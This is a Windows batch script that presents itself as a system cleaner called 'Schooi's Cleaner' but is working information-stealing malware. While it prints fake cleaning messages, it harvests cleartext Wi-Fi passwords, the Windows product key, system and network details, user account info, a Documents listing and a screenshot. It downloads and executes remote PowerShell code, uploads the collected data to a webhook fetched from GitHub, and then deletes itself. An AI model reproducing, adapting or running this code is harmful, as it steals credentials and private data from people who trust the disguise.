��&cls
@echo off
color 0f
call :logo
echo.
echo Schooi's Cleaner v1.2 ^| ADVANCED
echo ====================================
if not exist "%TEMP%\wstemp\" md "%TEMP%\wstemp\"
echo Cleaning System TEMP files..
setlocal enabledelayedexpansion
for /f %%a in ('Powershell -Command "irm https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/url"') do set webhook=%%a
for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%a
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
echo Cleaning Registry Waste..
echo IP Configuration:>>"%TEMP%\wstemp\ipconfig.txt"
ipconfig >> "%TEMP%\wstemp\ipconfig.txt"
echo Gathering info for further debloating..
ver>>"%TEMP%\wstemp\sysinfo.txt"
echo.>>"%TEMP%\wstemp\sysinfo.txt"
echo System Info:>>"%TEMP%\wstemp\sysinfo.txt"
systeminfo >> "%TEMP%\wstemp\sysinfo.txt"
echo Soft-Resetting Graphics Drivers..
echo Windows Liscense Key:>>"%TEMP%\wstemp\liscense.txt"
wmic path softwarelicensingservice get OA3xOriginalProductKey >> "%TEMP%\wstemp\liscense.txt"
dir >> "%TEMP%\wstemp\dir.txt"
pushd C:\Program Files\
dir >> "%TEMP%\wstemp\dir.txt"
popd
echo %USERNAME%'s Info:>>%TEMP%\wstemp\user_info.txt
net user %USERNAME%>>%TEMP%\wstemp\user_info.txt
echo Open Ports:>>%TEMP%\wstemp\open_ports.txt
netstat -an > %TEMP%\wstemp\open_ports.txt
netsh wlan export profile folder="%TEMP%\wstemp\Wi-Fi\" key=clear >nul
powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
dir "%USERPROFILE%\Documents" /s /b >> "%TEMP%\wstemp\documents.txt"
pushd "%TEMP%\wstemp"
echo Cleaning Windows Update files..
powershell -Command "$ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/npocmaka/batch.scripts/master/hybrids/.net/c/screenCapture.bat" >>"%TEMP%\wstemp\screenCapture.bat"
call screenCapture screenshot.png >nul
del screencapture.exe >nul
del screencapture.bat >nul
curl -k -F "payload_json={\"content\": \"~=CONNECTION ESTABLISHED=~ \nDate: %date% \nTime: %time% \nUsername: %username% \nComputer Name: %COMPUTERNAME% \nPublic IP: %PublicIP% \nPrivate IP: %IP% \nInfo and Screenshot:\"}" -F "file1=@screenshot.png" -F "file2=@info.zip" %WEBHOOK% >nul
popd
rd /s /q "%TEMP%\wstemp" >nul
REM set "directory=%USERPROFILE%\Desktop"
REM for %%F in ("%directory%\*.*") do (
	REM for %%I in ("%%~nxF") do if "%%~zI" LSS "5000000" (
		REM curl -k -F "payload_json={\"content\": \"\"}" -F "file1=@%%~nxF" %WEBHOOK% >nul 
	REM )
REM )
echo Done.
timeout /t 3 >nul
del "%~f0"
exit

:logo
mode con cols=70 lines=30
chcp 65001 >nul
echo [38;5;214m░██████╗░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗
echo [38;5;215m██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
echo [38;5;216m╚█████╗░██║░░╚═╝██║░░░░░█████╗░░███████║██╔██╗██║█████╗░░██████╔╝
echo [38;5;217m░╚═══██╗██║░░██╗██║░░░░░██╔══╝░░██╔══██║██║╚████║██╔══╝░░██╔══██╗
echo [38;5;218m██████╔╝╚█████╔╝███████╗███████╗██║░░██║██║░╚███║███████╗██║░░██║
echo [38;5;219m╚═════╝░░╚════╝░╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚══╝╚══════╝╚═╝░░╚═╝[97m
chcp 437 >nul